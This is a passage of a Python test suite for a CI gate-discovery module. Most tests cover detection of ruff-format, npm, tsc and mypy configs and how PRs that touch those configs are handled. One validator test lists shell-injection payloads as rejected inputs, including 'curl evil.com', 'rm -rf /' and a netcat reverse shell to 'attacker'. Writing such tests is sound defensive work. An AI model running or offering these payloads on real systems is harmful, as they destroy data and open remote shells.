        run("config", "user.email", "t@e.com")
        run("config", "user.name", "T")
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        # BASE: hook covers all Python files (no files: restriction).
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n",
            encoding="utf-8",
        )
        run("add", ".")
        run("commit", "-q", "-m", "base")
        # PR: narrows the scope to ^src/ — ``a.py`` would now be excluded.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n"
            "        files: ^src/\n",
            encoding="utf-8",
        )
        run("add", ".")
        run("commit", "-q", "-m", "narrow ruff-format scope")
        import shutil as _shutil

        _real_which = _shutil.which

        def _which_ruff_only(name: str, **kw: object) -> object:
            if name == "ruff":
                return "/usr/bin/ruff"
            return _real_which(name, **kw)

        with patch("pdd.checkup_gates.shutil.which", side_effect=_which_ruff_only):
            gates = discover_gates(
                tmp_path,
                changed_files=("a.py", ".pre-commit-config.yaml"),
                base_ref="HEAD~1",
            )
        names = {g.name for g in gates}
        # Scope changed → treat as PR-modified signal → gate must NOT fire
        # from the CI-signal branch. (No pyproject opt-in either.)
        assert "ruff-format" not in names

    def test_multi_hook_union_covers_all_scopes(self, tmp_path: Path) -> None:
        """Codex pass-10 finding 3: when ``.pre-commit-config.yaml``
        declares multiple ``id: ruff-format`` hooks with different
        ``files:`` scopes, a file covered by ANY hook must appear in
        the gate's argv. Pre-fix returned after the first hook, so files
        covered only by later hooks were never format-checked.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "code.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "scripts").mkdir()
        (tmp_path / "scripts" / "run.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        # Two hooks with different scopes — union should cover both dirs.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n"
            "        files: ^src/\n"
            "      - id: ruff-format\n"
            "        files: ^scripts/\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(
                tmp_path,
                changed_files=("src/code.py", "scripts/run.py"),
            )
        by_name = {g.name: g for g in gates}
        assert "ruff-format" in by_name
        cmd = by_name["ruff-format"].cmd
        # Both files must appear via union of the two hook scopes.
        assert "src/code.py" in cmd
        assert "scripts/run.py" in cmd

    def test_workflow_signal_ignores_pre_commit_scope(self, tmp_path: Path) -> None:
        """Codex pass-11 finding 1: when a GitHub Actions workflow runs
        ``ruff format --check``, the pre-commit hook's ``files: ^src/``
        scope must NOT filter the gate — the workflow may check files
        outside that scope (e.g. ``tests/``). Pre-fix applied the
        pre-commit scope unconditionally for all CI-signal opt-ins.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "code.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "tests").mkdir()
        (tmp_path / "tests" / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        # Pre-commit hook scoped to src/ only.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n"
            "        files: ^src/\n",
            encoding="utf-8",
        )
        # GitHub Actions workflow also runs ruff format (covers all Python).
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(
            "jobs:\n  lint:\n    steps:\n      - run: ruff format --check .\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(
                tmp_path,
                changed_files=("src/code.py", "tests/a.py"),
            )
        by_name = {g.name: g for g in gates}
        assert "ruff-format" in by_name
        cmd = by_name["ruff-format"].cmd
        # Workflow signal → no pre-commit scope filtering → both files present.
        assert "src/code.py" in cmd
        assert "tests/a.py" in cmd

    def test_skips_workflow_yaml_job_name_false_positive(self, tmp_path: Path) -> None:
        """Codex pass-11 finding 2: a workflow YAML key like
        ``name: ruff-format migration`` must NOT trigger the
        ruff-format gate — only actual ``ruff format`` command
        invocations in ``run:`` steps count. Pre-fix used
        _RUFF_FORMAT_CI_PATTERN (allows hyphens) for workflow files
        too, causing false positives on job or step names.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        # Workflow has step names containing "ruff format" / "ruff-format"
        # but does NOT actually run ruff format.
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(
            "jobs:\n"
            "  migrate:\n"
            "    steps:\n"
            "      - name: ruff format migration\n"
            "        run: echo done\n"
            "      - name: ruff-format cleanup\n"
            "        run: echo also done\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        # Step name matches must NOT trigger the gate (only run: values count).
        assert "ruff-format" not in names

    def test_skips_workflow_non_exec_multiline_block_false_positive(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-13 finding 2: a non-executable multi-line block
        scalar (e.g. an ``env: NOTE: |`` note) that merely mentions
        ``ruff format`` must NOT trigger the gate. The pre-fix line scan
        treated continuation lines as ``run:`` block continuations and
        counted them.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        # The ``NOTE`` env value is a block scalar mentioning ruff format,
        # but nothing in an exec position actually runs it.
        (wf / "ci.yml").write_text(
            "jobs:\n"
            "  build:\n"
            "    env:\n"
            "      NOTE: |\n"
            "        We plan to add ruff format --check here later.\n"
            "        Tracking issue: #123.\n"
            "    steps:\n"
            "      - run: echo building\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "ruff-format" not in names

    def test_emits_ruff_format_when_cloudbuild_args_invoke_it(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-13 finding 3: a CloudBuild step that invokes ruff via
        ``args: ["-c", "ruff format --check ."]`` must trigger the gate.
        The pre-fix scan only honoured ``run``/``script``/``command``/
        ``entrypoint`` keys and missed the inline-args form.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        (tmp_path / "cloudbuild-prod-ci.yaml").write_text(
            "steps:\n"
            "  - name: python:3.12\n"
            "    entrypoint: bash\n"
            '    args: ["-c", "ruff format --check ."]\n',
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "ruff-format" in names

    def test_skips_ruff_format_when_hook_stages_made_manual(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-11 finding 3: a PR that adds ``stages: [manual]``
        to the ``id: ruff-format`` hook changes its semantics (it no
        longer runs on normal pre-commit) without touching
        ``files:``/``exclude:``. The full-hook-config comparison must
        detect this and treat the signal as PR-modified (gate suppressed).
        """
        import subprocess

        from pdd.checkup_gates import discover_gates

        def run(*args: str) -> None:
            subprocess.run(
                ["git", *args], cwd=tmp_path, check=True, capture_output=True
            )

        _git_init(tmp_path)
        run("config", "user.email", "t@e.com")
        run("config", "user.name", "T")
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        # BASE: hook runs on every pre-commit invocation.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n",
            encoding="utf-8",
        )
        run("add", ".")
        run("commit", "-q", "-m", "base")
        # PR: adds stages: [manual] — hook no longer runs automatically.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n"
            "        stages: [manual]\n",
            encoding="utf-8",
        )
        run("add", ".")
        run("commit", "-q", "-m", "make ruff-format manual-only")
        import shutil as _shutil

        _real_which = _shutil.which

        def _which_ruff_only(name: str, **kw: object) -> object:
            if name == "ruff":
                return "/usr/bin/ruff"
            return _real_which(name, **kw)

        with patch("pdd.checkup_gates.shutil.which", side_effect=_which_ruff_only):
            gates = discover_gates(
                tmp_path,
                changed_files=("a.py", ".pre-commit-config.yaml"),
                base_ref="HEAD~1",
            )
        names = {g.name for g in gates}
        # Hook config changed (stages added) → treat as PR-modified → no gate.
        assert "ruff-format" not in names

    def test_skips_ruff_format_when_default_stages_made_manual(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-12 finding 3: ``default_stages`` is a top-level
        field that applies when a hook has no ``stages:``. A PR that
        changes ``default_stages: [pre-commit]`` → ``[manual]`` must be
        detected even though the hook dict itself is unchanged.
        ``_parse_ruff_format_hooks_from_text`` now propagates
        ``default_stages`` into the merged hook dict so the JSON
        comparison catches the change.
        """
        import subprocess

        from pdd.checkup_gates import discover_gates

        def run(*args: str) -> None:
            subprocess.run(
                ["git", *args], cwd=tmp_path, check=True, capture_output=True
            )

        _git_init(tmp_path)
        run("config", "user.email", "t@e.com")
        run("config", "user.name", "T")
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        # BASE: default_stages applies to all hooks including ruff-format.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "default_stages: [pre-commit]\n"
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n",
            encoding="utf-8",
        )
        run("add", ".")
        run("commit", "-q", "-m", "base")
        # PR: changes default_stages to [manual] — hook no longer runs automatically.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "default_stages: [manual]\n"
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n",
            encoding="utf-8",
        )
        run("add", ".")
        run("commit", "-q", "-m", "make all hooks manual-only via default_stages")
        import shutil as _shutil

        _real_which = _shutil.which

        def _which_ruff_only(name: str, **kw: object) -> object:
            if name == "ruff":
                return "/usr/bin/ruff"
            return _real_which(name, **kw)

        with patch("pdd.checkup_gates.shutil.which", side_effect=_which_ruff_only):
            gates = discover_gates(
                tmp_path,
                changed_files=("a.py", ".pre-commit-config.yaml"),
                base_ref="HEAD~1",
            )
        names = {g.name for g in gates}
        # default_stages changed → merged hook dict differs → no gate.
        assert "ruff-format" not in names

    def test_emits_ruff_format_when_ci_signal_present_and_no_tool_ruff_section(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-8 finding 3: the ruff-format gate is independent
        of the ruff lint gate. A project that runs ``ruff format
        --check`` in CI with no ``[tool.ruff]`` declaration at all
        MUST still get the gate when the CI-signal scan opts in.
        Pre-fix code nested the format gate inside the [tool.ruff]
        block and silently skipped this case, re-introducing the
        Bug #2 local-clean / CI-red failure.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        # NO [tool.ruff] at all — only a [project] table.
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        # CI signal: pre-commit hook id.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        # Lint gate stays absent (no [tool.ruff]) but format gate
        # MUST fire because CI runs ruff format.
        assert "ruff" not in names
        assert "ruff-format" in names

    def test_emits_ruff_format_when_signaled_by_canonical_precommit_hook_id(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-7 finding 1: the canonical pre-commit hook id is
        ``ruff-format`` (hyphen). The pre-fix regex
        ``\\bruff\\s+format\\b`` required whitespace between the
        tokens and missed the standard form, leaving every
        canonical-pre-commit project as a silent false negative.
        The updated regex matches both space and hyphen separators.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        # Canonical .pre-commit-config.yaml — NO mention of literal
        # "ruff format" (space-separated). Only the hyphenated hook id.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "ruff-format" in names

    def test_ci_signal_excludes_only_touched_files_not_whole_branch(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-7 finding 2: when the PR touches ONE CI config
        but an UNCHANGED ``.pre-commit-config.yaml`` (or another
        workflow) still runs ruff format, the gate MUST honour that
        unchanged signal. Pre-fix code suppressed the entire CI-signal
        branch on any touched CI file, reintroducing the local-clean +
        failing-CI gap. The granular suppression skips only the
        touched files from the scan.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        # UNCHANGED pre-commit config has the canonical ruff-format hook.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n",
            encoding="utf-8",
        )
        # PR touches an UNRELATED workflow file (no ruff format inside).
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "release.yml").write_text(
            "jobs:\n  release:\n    steps:\n      - run: echo release\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(
                tmp_path,
                changed_files=("a.py", ".github/workflows/release.yml"),
            )
        names = {g.name for g in gates}
        # Even though one workflow file is in the diff, the unchanged
        # .pre-commit-config.yaml still signals ruff format → gate fires.
        assert "ruff-format" in names

    def test_skips_ruff_format_ci_signal_when_pr_touched_workflow(
        self, tmp_path: Path
    ) -> None:
        """Defence: a PR that adds ``ruff format`` to a workflow file
        MUST NOT immediately enable the gate (the operator hasn't
        merged yet, and a fork PR could otherwise smuggle the gate in
        to delay merge). Skip the CI-signal check when the PR touched
        the same workflow file.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(
            "jobs:\n  lint:\n    steps:\n      - run: ruff format --check\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(
                tmp_path,
                changed_files=("a.py", ".github/workflows/ci.yml"),
            )
        names = {g.name for g in gates}
        # Workflow file touched by PR ⇒ CI signal disabled. No
        # `[tool.ruff.format]` either ⇒ no opt-in remaining ⇒ skip.
        assert "ruff-format" not in names

    def test_emits_ruff_format_when_black_declared_but_ruff_format_opted_in(
        self, tmp_path: Path
    ) -> None:
        """Codex review pass-4 finding 3 corollary: when a project
        EXPLICITLY opts into ruff format via ``[tool.ruff.format]``,
        the gate MUST fire even when ``[tool.black]`` is also declared
        (the operator declared both intentionally — perhaps migrating
        from black, perhaps using ruff format with custom options).
        Explicit opt-in wins over the black-also-declared default.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n"
            '[tool.ruff.format]\nquote-style = "double"\n'
            "[tool.black]\nline-length = 100\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/tool"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "ruff" in names
        assert "ruff-format" in names

    def test_user_extra_allow_is_honored(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(
            tmp_path, changed_files=(), extra_allow=("git-diff-check",)
        )
        names = [g.name for g in gates]
        assert "git-diff-check" in names

    def test_gates_use_list_form_no_shell(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        for gate in gates:
            assert isinstance(gate.cmd, list)
            for token in gate.cmd:
                assert isinstance(token, str)

    def test_script_rejects_shell_metacharacters(self) -> None:
        """Codex review iteration 1, Finding 1: ``npm run`` shells out, so
        any metacharacter in the script body chains. The allowlist MUST
        reject metacharacters even when the leading tool name is
        recognised (``prettier --check``).
        """
        from pdd.checkup_gates import _script_is_acceptable

        injected_payloads = [
            "prettier --check && curl evil.com",
            "prettier --check || rm -rf /",
            "prettier --check; echo p0wned",
            "prettier --check | tee /tmp/x",
            "prettier --check & sleep 9999",
            "prettier --check `whoami`",
            "prettier --check $(whoami)",
            "prettier --check ${HOME}",
            "prettier --check > /tmp/out",
            "prettier --check >> /tmp/out",
            "prettier --check < /etc/passwd",
            "prettier --check << EOF",
            "prettier --check\nrm -rf /",
            "curl evil.com",
            "wget evil.com",
            "nc -e /bin/sh attacker 4444",
            "bash -c 'evil'",
            "sh -c 'evil'",
            "eval 'echo bad'",
            "node -e 'process.exit(7)'",
        ]
        for payload in injected_payloads:
            assert _script_is_acceptable(payload) is False, (
                f"shell metachar payload {payload!r} must be rejected"
            )

    def test_script_gate_skipped_when_custom_config_pr_modified(
        self, tmp_path: Path
    ) -> None:
        """Iter-34 Finding 3: stable script bodies can point at a
        custom config via ``--config <path>``. The iter-27
        well-known-config skip misses these because it only checks
        default-named files. Skip the gate when the cited path is
        in the PR diff.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "lint:check": "eslint --no-fix --config config/lint.json src",
                    "format:check": "prettier --check --config tools/p.json .",
                }
            ),
            encoding="utf-8",
        )
        # PR modifies the custom config path — corresponding gate skips.
        gates = discover_gates(tmp_path, changed_files=("config/lint.json",))
        assert "npm:lint:check" not in {g.name for g in gates}
        gates = discover_gates(tmp_path, changed_files=("tools/p.json",))
        assert "npm:format:check" not in {g.name for g in gates}
        # Sanity: a non-config / non-JS PR touch still lets the
        # gates fire (subject to other iter-29/30 skips — use a
        # markdown file so the JS-plugin skip does not trip).
        gates = discover_gates(tmp_path, changed_files=("README.md",))
        names = {g.name for g in gates}
        assert "npm:lint:check" in names
        assert "npm:format:check" in names

    def test_script_gate_detects_dotdot_normalised_config_path(self) -> None:
        """Iter-37 Finding 3: ``--config config/../config/lint.json``
        is the same target as ``config/lint.json`` once collapsed.
        The pre-fix code only stripped ``./`` and compared raw
        strings, so the equality check missed. Use os.path.normpath
        on both sides.
        """
        from pdd.checkup_gates import _script_references_pr_modified_config

        pr_set = {"config/lint.json"}
        for script in (
            "eslint --no-fix --config config/../config/lint.json src",
            "eslint --no-fix --config ./config/./lint.json src",
            "eslint --no-fix --config config//lint.json src",
        ):
            assert _script_references_pr_modified_config(script, pr_set), (
                f"non-canonical config path missed in {script!r}"
            )

    def test_npm_tsc_script_gate_skipped_when_custom_p_extends_base_pr_modified(
        self, tmp_path: Path
    ) -> None:
        """Iter-37 Finding 1: ``tsc -p config/build.json --noEmit``
        where ``config/build.json`` extends ``./base.json`` and the
        PR modifies ``config/base.json`` — iter-36 only walked the
        ROOT tsconfig's extends chain and missed this path.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {
                        "typecheck": "tsc -p config/build.json --noEmit",
                    },
                }
            ),
            encoding="utf-8",
        )
        cfg_dir = tmp_path / "config"
        cfg_dir.mkdir()
        (cfg_dir / "base.json").write_text(
            '{"compilerOptions": {"strict": true}}\n',
            encoding="utf-8",
        )
        (cfg_dir / "build.json").write_text(
            '{"extends": "./base.json"}\n',
            encoding="utf-8",
        )
        # No top-level tsconfig.json — iter-36's root-only walk
        # would emit the gate. iter-37 walks from the -p target.
        gates = discover_gates(tmp_path, changed_files=("config/base.json",))
        assert "npm:typecheck" not in {g.name for g in gates}

    def test_npm_tsc_script_gate_skipped_when_p_dir_extends_base_pr_modified(
        self, tmp_path: Path
    ) -> None:
        """Iter-37 Finding 2: tsc accepts ``-p <directory>`` and
        looks for ``<dir>/tsconfig.json``. Same RCE/false-pass
        scenario as Finding 1 via the directory form.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {"typecheck": "tsc -p config --noEmit"},
                }
            ),
            encoding="utf-8",
        )
        cfg_dir = tmp_path / "config"
        cfg_dir.mkdir()
        (cfg_dir / "base.json").write_text(
            '{"compilerOptions": {"strict": true}}\n',
            encoding="utf-8",
        )
        (cfg_dir / "tsconfig.json").write_text(
            '{"extends": "./base.json"}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("config/base.json",))
        assert "npm:typecheck" not in {g.name for g in gates}

    def test_script_gate_detects_hidden_dir_config(self) -> None:
        """Iter-36 Finding 1: ``.config/lint.json`` previously
        collapsed to ``config/lint.json`` because the normaliser
        used ``str.lstrip("./")``, which strips any combination of
        ``.`` and ``/``. Use a single-prefix removeprefix so
        hidden-directory paths survive the comparison.
        """
        from pdd.checkup_gates import _script_references_pr_modified_config

        pr_set = {".config/lint.json"}
        for script in (
            "eslint --no-fix --config .config/lint.json src",
            "eslint --no-fix --config ./.config/lint.json src",
            'eslint --no-fix --config ".config/lint.json" src',
        ):
            assert _script_references_pr_modified_config(script, pr_set), (
                f"hidden-dir config path missed in {script!r}"
            )

    def test_script_gate_detects_quoted_path_with_spaces(self) -> None:
        """Iter-36 Finding 2: ``.split()`` breaks
        ``--config "./config/lint config.json"`` into multiple
        tokens, so the equality check silently failed. Use
        shlex-style quote-aware tokenisation.
        """
        from pdd.checkup_gates import _script_references_pr_modified_config

        pr_set = {"config/lint config.json"}
        for script in (
            'eslint --no-fix --config "./config/lint config.json" src',
            "eslint --no-fix --config './config/lint config.json' src",
            'eslint --no-fix --config="./config/lint config.json" src',
        ):
            assert _script_references_pr_modified_config(script, pr_set), (
                f"quoted-with-spaces config path missed in {script!r}"
            )

    def test_npm_tsc_script_gate_skipped_when_extends_chain_base_pr_modified(
        self, tmp_path: Path
    ) -> None:
        """Iter-36 Finding 3: ``tsconfig.json`` extending ``base.json``
        lets a PR modify ``base.json`` (a NON-``tsconfig*.json``
        name) to relax compiler options. The iter-27
        ``tsconfig*.json`` filename check missed it and the
        iter-29 chain walk only checked emit flags. Collect every
        local tsconfig in the chain and skip the script gate when
        ANY chain file is in the PR diff.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {"typecheck": "tsc -p tsconfig.json --noEmit"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "base.json").write_text(
            '{"compilerOptions": {"strict": true}}\n',
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"extends": "./base.json"}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("base.json",))
        assert "npm:typecheck" not in {g.name for g in gates}

    def test_script_gate_handles_equals_and_short_config_forms(self) -> None:
        """Iter-34 Finding 3: ``--config=<path>`` and ``-c <path>``
        shorthand forms must also be recognised. Iter-35 Findings
        2 + 3 extend the set with quoted paths and tsc ``-p`` /
        ``--project`` project-file flags.
        """
        from pdd.checkup_gates import _script_references_pr_modified_config

        pr_set = {"config/lint.json"}
        for script in (
            # Iter-34 forms
            "eslint --no-fix --config config/lint.json src",
            "eslint --no-fix --config=config/lint.json src",
            "eslint --no-fix -c config/lint.json src",
            "eslint --no-fix -c=config/lint.json src",
            # Iter-35 Finding 2: quoted paths
            'eslint --no-fix --config "./config/lint.json" src',
            "eslint --no-fix --config './config/lint.json' src",
            'eslint --no-fix --config="config/lint.json" src',
            "eslint --no-fix -c './config/lint.json' src",
        ):
            assert _script_references_pr_modified_config(script, pr_set), (
                f"missed config reference in {script!r}"
            )
        # Iter-35 Finding 3: tsc ``-p`` / ``--project`` are
        # equivalent custom-config flags.
        ts_pr_set = {"config/build.json"}
        for script in (
            "tsc -p config/build.json --noEmit",
            "tsc --project config/build.json --noEmit",
            "tsc -p=config/build.json --noEmit",
            "tsc --project=config/build.json --noEmit",
            'tsc -p "./config/build.json" --noEmit',
        ):
            assert _script_references_pr_modified_config(script, ts_pr_set), (
                f"missed tsc project reference in {script!r}"
            )
        # Unrelated PR-modified file does NOT trip the skip.
        assert not _script_references_pr_modified_config(
            "eslint --no-fix --config config/lint.json src",
            {"src/foo.ts"},
        )

    def test_mypy_gate_skipped_when_mypy_ini_declares_local_plugin(
        self, tmp_path: Path
    ) -> None:
        """Iter-34 Finding 2: mypy.ini / setup.cfg ``[mypy] plugins``
        was not parsed by iter-32. A stable mypy.ini referencing a
        worktree-local plugin plus a PR modifying ONLY that plugin
        file slipped past the pyproject-only check.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text("[tool.mypy]\n", encoding="utf-8")
        # mypy.ini variant.
        (tmp_path / "mypy.ini").write_text(
            "[mypy]\nplugins = ./evil_plugin.py\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        assert "mypy" not in {g.name for g in gates}
        # setup.cfg variant with a mixed package/local plugin list.
        (tmp_path / "mypy.ini").unlink()
        (tmp_path / "setup.cfg").write_text(
            "[mypy]\nplugins = some_pkg.main, plugins/evil.py\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        assert "mypy" not in {g.name for g in gates}

    def test_script_rejects_tsc_unsafe_runtime_flags(self) -> None:
        """Iter-33: ``--noEmit`` only suppresses ``.js``/``.d.ts``
        emission. A long tail of OTHER tsc flags still hang the
        gate (``--watch``) or write artifacts into the worktree
        (``--incremental`` without an explicit ``false``,
        ``--generateTrace``, ``--generateCpuProfile``, the
        diagnostic-dump flags). The script-based tsc gate cannot
        inject overrides like the direct gate, so it must reject
        any of these flags outright.
        """
        from pdd.checkup_gates import _script_is_acceptable

        for payload in (
            "tsc --noEmit --watch",
            "tsc --noEmit -w",
            "tsc --watch=true --noEmit",
            "tsc --noEmit --incremental",
            "tsc --noEmit --incremental=true",
            "tsc --noEmit --incremental --tsBuildInfoFile foo",
            "tsc --noEmit --generateTrace trace-out",
            "tsc --noEmit --generateCpuProfile profile.cpuprofile",
            "tsc --noEmit --listFiles",
            "tsc --noEmit --listEmittedFiles",
            "tsc --noEmit --diagnostics",
            "tsc --noEmit --extendedDiagnostics",
            "tsc --noEmit --traceResolution",
            "tsc -p tsconfig.json --noEmit --watch",
        ):
            assert _script_is_acceptable(payload) is False, (
                f"unsafe tsc flag must be rejected: {payload!r}"
            )
        # Sanity: explicit disables of the only-with-value flags
        # are accepted.
        assert _script_is_acceptable("tsc --noEmit --incremental false") is True
        assert _script_is_acceptable("tsc --noEmit --incremental=false") is True

    def test_script_rejects_nested_package_manager_run_prefix(self) -> None:
        """Iter-31 Finding 1: ``npm run X`` / ``yarn run X`` / ``pnpm
